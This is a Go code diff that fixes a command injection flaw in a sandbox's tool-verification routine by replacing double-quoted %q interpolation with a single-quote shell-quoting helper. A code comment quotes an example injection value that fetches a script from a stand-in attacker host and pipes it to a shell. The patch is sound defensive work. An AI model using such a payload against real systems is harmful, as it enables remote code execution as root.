@@ -295,6 +295,16 @@ func (m *Manager) boot(ctx context.Context, inst *protocol.Instance, p protocol.
 	return m.db.UpdateInstance(ctx, inst)
 }
 
+// shellQuote renders a string as a single POSIX shell word.
+//
+// Single quotes suppress every expansion bash performs, which double quotes do
+// not: inside double quotes, command substitution still runs. The only
+// character needing care is the single quote itself, closed and reopened
+// around an escaped one.
+func shellQuote(s string) string {
+	return "'" + strings.ReplaceAll(s, "'", `'\''`) + "'"
+}
+
 // toolBinaries maps a tool name to the command it actually provides, where
 // they differ.
 var toolBinaries = map[string]string{
@@ -324,9 +334,12 @@ func (m *Manager) verifyTools(ctx context.Context, inst *protocol.Instance, want
 		if mapped, ok := toolBinaries[t]; ok {
 			bin = mapped
 		}
-		// The tool name is echoed, not the binary, so the caller gets back the
-		// names it asked about.
-		fmt.Fprintf(&sb, "command -v %q >/dev/null 2>&1 && echo %q\n", bin, t)
+		// Single-quoted, not %q. Go's %q produces a DOUBLE-quoted string, and
+		// bash expands $(...) and backticks inside double quotes — so a tool
+		// name of `$(curl attacker/x|sh)` was arbitrary command execution as
+		// root in the sandbox, reachable by anyone who could create a bot.
+		fmt.Fprintf(&sb, "command -v %s >/dev/null 2>&1 && echo %s\n",
+			shellQuote(bin), shellQuote(t))
 	}
 
 	out, err := m.docker.ExecAs(ctx, inst.Runtime, "0", []string{"bash", "-lc", sb.String()})
